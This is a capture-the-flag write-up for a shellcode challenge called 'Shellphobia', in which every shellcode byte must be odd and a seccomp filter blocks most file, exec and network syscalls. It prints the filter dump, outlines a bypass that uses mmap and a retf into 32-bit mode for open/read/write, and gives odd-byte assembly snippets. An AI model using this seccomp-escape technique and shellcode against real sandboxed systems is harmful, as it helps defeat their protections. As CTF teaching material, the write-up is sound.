# Shellphobia
- checksec, nothing we need here, its shellcoding time!!
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```



- shellcode challenge where
    - every byte needs to be odd
    - used seccomp, so we are limited

- using `seccomp-tools`
```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x15 0x1d 0x00 0x00000002  if (A == open) goto 0033
 0004: 0x15 0x1c 0x00 0x00000101  if (A == openat) goto 0033
 0005: 0x15 0x1b 0x00 0x000001b5  if (A == 0x1b5) goto 0033
 0006: 0x15 0x1a 0x00 0x00000055  if (A == creat) goto 0033
 0007: 0x15 0x19 0x00 0x00000000  if (A == read) goto 0033
 0008: 0x15 0x18 0x00 0x00000013  if (A == readv) goto 0033
 0009: 0x15 0x17 0x00 0x00000127  if (A == preadv) goto 0033
 0010: 0x15 0x16 0x00 0x00000147  if (A == preadv2) goto 0033
 0011: 0x15 0x15 0x00 0x00000011  if (A == pread64) goto 0033
 0012: 0x15 0x14 0x00 0x00000028  if (A == sendfile) goto 0033
 0013: 0x15 0x13 0x00 0x00000001  if (A == write) goto 0033
 0014: 0x15 0x12 0x00 0x00000012  if (A == pwrite64) goto 0033
 0015: 0x15 0x11 0x00 0x00000014  if (A == writev) goto 0033
 0016: 0x15 0x10 0x00 0x00000128  if (A == pwritev) goto 0033
 0017: 0x15 0x0f 0x00 0x00000148  if (A == pwritev2) goto 0033
 0018: 0x15 0x0e 0x00 0x0000003b  if (A == execve) goto 0033
 0019: 0x15 0x0d 0x00 0x00000142  if (A == execveat) goto 0033
 0020: 0x15 0x0c 0x00 0x0000000a  if (A == mprotect) goto 0033
 0021: 0x15 0x0b 0x00 0x00000015  if (A == access) goto 0033
 0022: 0x15 0x0a 0x00 0x00000020  if (A == dup) goto 0033
 0023: 0x15 0x09 0x00 0x00000021  if (A == dup2) goto 0033
 0024: 0x15 0x08 0x00 0x00000029  if (A == socket) goto 0033
 0025: 0x15 0x07 0x00 0x00000031  if (A == bind) goto 0033
 0026: 0x15 0x06 0x00 0x00000032  if (A == listen) goto 0033
 0027: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0033
 0028: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0033
 0029: 0x15 0x03 0x00 0x0000003d  if (A == wait4) goto 0033
 0030: 0x15 0x02 0x00 0x000000f7  if (A == waitid) goto 0033
 0031: 0x15 0x01 0x00 0x0000013d  if (A == seccomp) goto 0033
 0032: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0033: 0x06 0x00 0x00 0x00000000  return KILL 
```

- as you can see, everything is block, this is a nice list to use for refernce in future seccomp challs xD

- after doing some searching, i found that we can use `r9` and `r11d` and xors to do all the ops we need. this writup is a gold mine [UIUCTF 2022 - ODD SHELL Writeup](https://ctftime.org/writeup/34832)



- and with even more researching and reading [Guide-of-Seccomp-in-CTF](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html) i found out that there three types of seccomp challs
    - `limited syscalls`: where we are forced to use some unknown syscalls
    - `0x40000000 seccomp`: seccomp that dont have `0x40000000` check can be bypassed 
    - `retf to 32bit mode`: seccomp that dont have `64bit` check can also be bypassed aka our chall here




- `mmap` syscall is not blocked
- so the game plan is
    - use mmap to allocate 32bit address to jump to later
    - write 32bit shell code in that area, to read more shellcode
    - do retf, and jump to the shellcode and send `32bit` open,read,write 


- solve script is a mess, but who cares


- usefull asm instructions i used
``` c
    // write any value in r9
    mov r11d, 0xffffff11
    xor r11d, 0xffffff33
    xor r9 , r9
    or r9,r11   
    // if you wanna write a 64bit value, use shitfs
    shl r9, 0xf
    shl r9, 0x1

    // adjust if you want
    inc r9
    dec r9


    // zero out the regs
    xor    ecx,ecx
    movzx  edx,cx
    movzx  esi,cx
    
    // write any value in regs
    lea  esi,[r9]


    // write in mem
    mov [r9] , r11                  

    // and more more xD
``` 


[solve script contains more details](x.py)


[author: T4K1](https://github.com/al-wasmo)
